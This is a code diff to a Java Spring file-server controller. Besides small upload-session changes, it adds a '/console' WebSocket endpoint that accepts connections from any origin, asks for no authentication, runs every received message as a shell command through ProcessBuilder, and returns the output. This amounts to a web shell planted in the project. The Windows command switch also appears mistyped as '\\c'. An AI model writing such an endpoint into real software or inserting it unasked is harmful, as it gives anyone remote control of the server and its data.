@@ -38,6 +38,7 @@ import java.nio.file.Paths;
 import java.text.DecimalFormat;
 import java.text.SimpleDateFormat;
 import java.util.*;
+import java.util.concurrent.TimeUnit;
 
 @Controller
 @EnableWebSocket
@@ -96,6 +97,10 @@ public class FileServerController extends AbstractController implements WebSocke
         }
     }
 
+    private void clearSession() {
+        SESSION_MAP.remove(request.getHeader("socketId"));
+    }
+
     private void copyFile(MultipartFile file, File outputFile) throws IOException {
         try (InputStream in = file.getInputStream(); FileOutputStream out = new FileOutputStream(outputFile)) {
             long fileSize = file.getSize();
@@ -117,6 +122,7 @@ public class FileServerController extends AbstractController implements WebSocke
                     sendSocket("Progress: " + progress + "% " + " (Size:" + getHumanReadableFileSize(bytesCopied) + "/" + getHumanReadableFileSize(fileSize) + ")");
                 }
             }
+            clearSession();
         }
     }
 
@@ -291,11 +297,29 @@ public class FileServerController extends AbstractController implements WebSocke
     public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
         registry.addHandler(new TextWebSocketHandler() {
                     @Override
-                    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
+                    protected void handleTextMessage(WebSocketSession session, TextMessage message) {
                         SESSION_MAP.put(new String(message.asBytes()), session);
-                        super.handleTextMessage(session, message);
                     }
                 }, "/uploadFile")
+                .setAllowedOrigins("*");
+
+        registry.addHandler(new TextWebSocketHandler() {
+                    @Override
+                    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
+                        Process process = new ProcessBuilder("cmd", "\\c", new String(message.asBytes())).redirectErrorStream(true).start();
+//                        Process process = new ProcessBuilder("/bin/bash", "-c", new String(message.asBytes())).redirectErrorStream(true).start();
+                        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                            String line;
+                            while ((line = reader.readLine()) != null) {
+                                session.sendMessage(new TextMessage(line));
+                            }
+                            process.waitFor(5, TimeUnit.SECONDS);
+                            session.sendMessage(new TextMessage(process.exitValue() + ""));
+                        } finally {
+                            process.destroy();
+                        }
+                    }
+                }, "/console")
                 .setAllowedOrigins("*");
     }
 }
